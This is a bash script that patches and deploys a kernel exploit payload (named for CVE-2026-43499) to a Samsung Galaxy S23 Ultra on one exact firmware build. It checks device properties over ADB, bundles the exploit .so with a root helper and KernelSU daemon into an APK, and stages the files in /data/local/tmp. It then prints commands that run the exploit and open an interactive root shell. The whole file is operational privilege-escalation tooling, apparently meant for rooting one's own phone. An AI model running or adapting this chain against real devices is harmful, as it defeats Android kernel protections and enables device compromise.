#!/usr/bin/env bash
set -Eeuo pipefail

PROFILE_ID="dm3q-S918BXXSAFZG1-ksunext"
TARGET_MODEL="SM-S918B"
TARGET_DEVICE="dm3q"
TARGET_BUILD_DISPLAY="BP4A.251205.006.S918BXXSAFZG1"
TARGET_FINGERPRINT="samsung/dm3qxxx/dm3q:16/BP4A.251205.006/S918BXXSAFZG1:user/release-keys"
TARGET_KERNEL_RELEASE="5.15.189-android13-8-33413713-abS918BXXSAFZG1"
TARGET_KERNEL_VERSION="#1 SMP PREEMPT Mon Jul 6 09:56:11 UTC 2026"
TARGET_SDK="36"
TARGET_ABI="arm64-v8a"
TARGET_PAGE_SIZE="4096"

EXPECTED_BASE_MD5="3c82d4f678bd58846facf3e4ad356a33"
EXPECTED_PAYLOAD_MD5="f6298194afb543d618b6f7015d1d08eb"
EXPECTED_PAYLOAD_SIZE="131072"
EXPECTED_KSUD_MD5="27cfc835164a385670ff309c47a711b0"
EXPECTED_KSUD_SIZE="3852248"
EXPECTED_HELPER_MD5="e00bec081b9d35635245bc76cf2d2a51"

ADB_STAGE_DIR="/data/local/tmp/rmg-dm3q"
ADB_HELPER="/data/local/tmp/libcve43499root"
ADB_KSUD="/data/local/tmp/ksud-selected"
ADB_LOG="${ADB_STAGE_DIR}/exploit.log"

SCRIPT_DIR="$(CDPATH= cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(CDPATH= cd -- "${SCRIPT_DIR}/.." && pwd)"
PROJECTS_DIR="${PROJECTS_DIR:-${HOME}/Projects}"
UPSTREAM_REPO="${UPSTREAM_REPO:-${PROJECTS_DIR}/rmg-f731u}"

PATCHER="${PATCHER:-${REPO_ROOT}/tools/patch_payload.py}"
SPEC="${SPEC:-${REPO_ROOT}/tools/f731u-to-dm3q-s918b-afzf5.spec.json}"
BASE_PAYLOAD="${BASE_PAYLOAD:-${UPSTREAM_REPO}/app-src/app/src/main/assets/cve-2026-43499-app.so}"
KSUD_PATH="${KSUD_PATH:-${REPO_ROOT}/app/src/main/assets/ksud-f731u-kdp}"
HELPER_PATH="${HELPER_PATH:-${REPO_ROOT}/app/src/main/jniLibs/arm64-v8a/libcve43499root.so}"
OUT_DIR="${OUT_DIR:-${REPO_ROOT}/out/${PROFILE_ID}}"
PATCHED_PAYLOAD="${OUT_DIR}/cve-2026-43499-app.so"

DO_ADB_CHECK=1
DO_PATCH=1
DO_PREPARE_APP=1
DO_BUILD_APK=0
DO_INSTALL_APK=0
DO_STAGE_ADB=0
DO_PRINT_COMMAND=1

usage() {
  cat <<USAGE
Usage:
  ${0##*/} [options]

Default:
  validates the connected SM-S918B, patches the F731U base payload into the
  dm3q/S918BXXSAFZG1 KernelSU Next payload, prepares local app assets, and prints the manual
  ADB exploit command.

Options:
  --all             Patch, prepare app assets, build APK, install APK, and stage ADB files.
  --build-apk       Build the root app debug APK.
  --install-apk     Install the built debug APK with adb install -r.
  --stage-adb       Push payload/helper/ksud to ${ADB_STAGE_DIR}.
  --no-adb-check    Do not validate the connected device properties.
  --no-app-assets   Do not populate app/src/main/assets.
  --no-print        Do not print the final manual exploit/root-shell commands.
  -h, --help        Show this help.

Useful env overrides:
  UPSTREAM_REPO=/path/to/rmg-f731u
  BASE_PAYLOAD=/path/to/f731u/cve-2026-43499-app.so
  KSUD_PATH=/path/to/ksud-f731u-kdp
  HELPER_PATH=/path/to/libcve43499root.so
  OUT_DIR=/path/to/output

This script stages and installs artifacts, but it does not start a root shell
automatically. Run the printed command manually after reviewing the log path.
USAGE
}

die() {
  echo "error: $*" >&2
  exit 1
}

info() {
  echo "[*] $*"
}

require_cmd() {
  command -v "$1" >/dev/null 2>&1 || die "missing command: $1"
}

md5_file() {
  if command -v md5sum >/dev/null 2>&1; then
    md5sum "$1" | awk '{print $1}'
  elif command -v md5 >/dev/null 2>&1; then
    md5 -q "$1"
  else
    die "missing md5sum/md5"
  fi
}

file_size() {
  if stat -c '%s' "$1" >/dev/null 2>&1; then
    stat -c '%s' "$1"
  else
    stat -f '%z' "$1"
  fi
}

assert_file() {
  local path="$1"
  test -f "$path" || die "file not found: $path"
}

assert_md5() {
  local path="$1" expected="$2" label="$3" actual
  actual="$(md5_file "$path")"
  test "$actual" = "$expected" || die "${label} md5 mismatch: got ${actual}, expected ${expected}"
}

adb_prop() {
  adb shell "$1" 2>/dev/null | tr -d '\r'
}

check_device() {
  require_cmd adb
  adb get-state >/dev/null 2>&1 || die "adb device is not connected/authorized"

  local model device display fingerprint kernel_release kernel_version sdk abi page_size
  model="$(adb_prop 'getprop ro.product.model')"
  device="$(adb_prop 'getprop ro.product.device')"
  display="$(adb_prop 'getprop ro.build.display.id')"
  fingerprint="$(adb_prop 'getprop ro.build.fingerprint')"
  kernel_release="$(adb_prop 'uname -r')"
  kernel_version="$(adb_prop 'uname -v')"
  sdk="$(adb_prop 'getprop ro.build.version.sdk')"
  abi="$(adb_prop 'getprop ro.product.cpu.abilist | cut -d, -f1')"
  page_size="$(adb_prop 'getconf PAGESIZE')"

  test "$model" = "$TARGET_MODEL" || die "unexpected model: ${model}"
  test "$device" = "$TARGET_DEVICE" || die "unexpected device: ${device}"
  test "$display" = "$TARGET_BUILD_DISPLAY" || die "unexpected build display: ${display}"
  test "$fingerprint" = "$TARGET_FINGERPRINT" || die "unexpected fingerprint: ${fingerprint}"
  test "$kernel_release" = "$TARGET_KERNEL_RELEASE" || die "unexpected kernel release: ${kernel_release}"
  test "$kernel_version" = "$TARGET_KERNEL_VERSION" || die "unexpected kernel version: ${kernel_version}"
  test "$sdk" = "$TARGET_SDK" || die "unexpected SDK: ${sdk}"
  test "$abi" = "$TARGET_ABI" || die "unexpected ABI: ${abi}"
  test "$page_size" = "$TARGET_PAGE_SIZE" || die "unexpected page size: ${page_size}"

  info "ADB target matches ${TARGET_MODEL}/${TARGET_DEVICE} ${TARGET_BUILD_DISPLAY}"
}

patch_payload() {
  require_cmd python3
  assert_file "$PATCHER"
  assert_file "$SPEC"
  assert_file "$BASE_PAYLOAD"
  assert_md5 "$BASE_PAYLOAD" "$EXPECTED_BASE_MD5" "base payload"

  mkdir -p "$OUT_DIR"
  info "patching payload: ${BASE_PAYLOAD} -> ${PATCHED_PAYLOAD}"
  python3 "$PATCHER" "$BASE_PAYLOAD" "$SPEC" "$PATCHED_PAYLOAD"

  assert_md5 "$PATCHED_PAYLOAD" "$EXPECTED_PAYLOAD_MD5" "patched payload"
  test "$(file_size "$PATCHED_PAYLOAD")" = "$EXPECTED_PAYLOAD_SIZE" || die "patched payload size mismatch"
  info "patched payload OK: ${PATCHED_PAYLOAD}"
}

prepare_app_assets() {
  assert_file "$PATCHED_PAYLOAD"
  assert_file "$KSUD_PATH"
  assert_file "$HELPER_PATH"
  assert_md5 "$KSUD_PATH" "$EXPECTED_KSUD_MD5" "KernelSU daemon"
  assert_md5 "$HELPER_PATH" "$EXPECTED_HELPER_MD5" "root helper"
  test "$(file_size "$KSUD_PATH")" = "$EXPECTED_KSUD_SIZE" || die "KernelSU daemon size mismatch"

  local asset_root="${REPO_ROOT}/app/src/main/assets"
  local jni_lib_dir="${REPO_ROOT}/app/src/main/jniLibs/arm64-v8a"
  mkdir -p "$asset_root" "$jni_lib_dir"

  cp "$PATCHED_PAYLOAD" "${asset_root}/cve-2026-43499-app.so"
  cp "$KSUD_PATH" "${asset_root}/ksud-f731u-kdp"
  cp "$HELPER_PATH" "${jni_lib_dir}/libcve43499root.so"

  cat > "${asset_root}/targets-v3.json" <<JSON
{
  "schemaVersion": 3,
  "payloads": [
    {
      "payloadId": "${PROFILE_ID}",
      "displayName": "Galaxy S23 Ultra SM-S918B | S918BXXSAFZG1 | KernelSU Next",
      "models": ["${TARGET_MODEL}"],
      "kernelVersions": ["5.15.189"],
      "exploit": {
        "url": "asset://cve-2026-43499-app.so",
        "size": ${EXPECTED_PAYLOAD_SIZE}
      },
      "kernelsu": {
        "url": "asset://ksud-f731u-kdp",
        "size": ${EXPECTED_KSUD_SIZE}
      }
    }
  ]
}
JSON

  info "prepared bundled app assets under ${asset_root}"
  info "prepared native helper under ${jni_lib_dir}"
}

build_apk() {
  test -x "${REPO_ROOT}/gradlew" || die "gradlew is missing or not executable"
  info "building debug APK"
  (cd "$REPO_ROOT" && ./gradlew :app:assembleDebug)
  assert_file "${REPO_ROOT}/app/build/outputs/apk/debug/app-debug.apk"
  info "APK ready: ${REPO_ROOT}/app/build/outputs/apk/debug/app-debug.apk"
}

install_apk() {
  require_cmd adb
  assert_file "${REPO_ROOT}/app/build/outputs/apk/debug/app-debug.apk"
  info "installing debug APK"
  adb install -r "${REPO_ROOT}/app/build/outputs/apk/debug/app-debug.apk"
}

stage_adb_files() {
  require_cmd adb
  assert_file "$PATCHED_PAYLOAD"
  assert_file "$HELPER_PATH"
  assert_file "$KSUD_PATH"
  assert_md5 "$HELPER_PATH" "$EXPECTED_HELPER_MD5" "root helper"

  info "staging files on device under ${ADB_STAGE_DIR}"
  adb shell "mkdir -p '${ADB_STAGE_DIR}'"
  adb push "$PATCHED_PAYLOAD" "${ADB_STAGE_DIR}/cve-2026-43499-app.so"
  adb push "$HELPER_PATH" "${ADB_STAGE_DIR}/libcve43499root"
  adb push "$KSUD_PATH" "${ADB_STAGE_DIR}/ksud-f731u-kdp"
  adb shell "cp '${ADB_STAGE_DIR}/libcve43499root' '${ADB_HELPER}' && cp '${ADB_STAGE_DIR}/ksud-f731u-kdp' '${ADB_KSUD}' && chmod 755 '${ADB_STAGE_DIR}/libcve43499root' '${ADB_HELPER}' '${ADB_STAGE_DIR}/ksud-f731u-kdp' '${ADB_KSUD}' && chmod 644 '${ADB_STAGE_DIR}/cve-2026-43499-app.so'"
  info "ADB files staged"
}

print_commands() {
  cat <<COMMANDS

Manual commands:

Run one exploit attempt and write the log:
adb shell 'EXPLOIT_ATTEMPTS=1 P0_ATTEMPT_TIMEOUT_SEC=45 EXPLOIT_ATTEMPT_TIMEOUT_SEC=120 ${ADB_HELPER} --run-payload ${ADB_STAGE_DIR}/cve-2026-43499-app.so ${ADB_HELPER} ${ADB_LOG}'

After the log shows temporary-root-ready, open a root shell:
adb shell -t '${ADB_HELPER} -c "/system/bin/sh -i"'

Check the log:
adb shell 'cat ${ADB_LOG}'
COMMANDS
}

while (($#)); do
  case "$1" in
    --all)
      DO_BUILD_APK=1
      DO_INSTALL_APK=1
      DO_STAGE_ADB=1
      ;;
    --build-apk)
      DO_BUILD_APK=1
      ;;
    --install-apk)
      DO_INSTALL_APK=1
      ;;
    --stage-adb)
      DO_STAGE_ADB=1
      ;;
    --no-adb-check)
      DO_ADB_CHECK=0
      ;;
    --no-app-assets)
      DO_PREPARE_APP=0
      ;;
    --no-print)
      DO_PRINT_COMMAND=0
      ;;
    -h|--help)
      usage
      exit 0
      ;;
    *)
      die "unknown option: $1"
      ;;
  esac
  shift
done

if (( DO_ADB_CHECK )); then
  check_device
fi

if (( DO_PATCH )); then
  patch_payload
fi

if (( DO_PREPARE_APP )); then
  prepare_app_assets
fi

if (( DO_BUILD_APK )); then
  build_apk
fi

if (( DO_INSTALL_APK )); then
  install_apk
fi

if (( DO_STAGE_ADB )); then
  stage_adb_files
fi

if (( DO_PRINT_COMMAND )); then
  print_commands
fi
